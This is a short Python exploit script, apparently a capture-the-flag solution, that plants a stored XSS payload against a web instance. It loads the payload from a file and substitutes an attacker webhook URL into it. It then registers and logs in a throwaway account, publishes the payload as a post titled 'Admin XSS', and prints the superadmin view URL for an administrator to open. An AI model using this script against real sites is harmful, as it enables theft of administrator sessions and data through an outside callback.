# payload.html

import random
import requests
import json


payload = ''
with open("payload.html") as f:
    payload = f.read()


print("length:", len(payload))
print("payload:",payload)
assert len(payload) < 210


web = input("[ Enter Instance URL ]: ").replace('/login', '')

# will be blocked if resource is not over HTTPS (burp collab does not specify https or http by default)
webhook = "https://"+input("[ Enter your webhook ]: ").replace('http://', '').replace('https://', '')
payload = payload.replace(r'{{WEBHOOK_HERE}}', webhook)

with open('test.html', 'w') as f:
    f.write(payload)

user = requests.Session()

username = f"datasnok{random.randint(0,10000)}"

user.post(web + "/register", json={"username":username,"password":"pass"})
user.post(web + "/login", json={"username": username, "password": "pass"})

result = user.post(web + "/user/posts/create", json={"title": "Admin XSS", "data": payload})

post_id = result.json()["postid"]

print("ADMIN SHOULD VISIT:")
print(web + "/superadmin/viewpost/" + str(post_id))
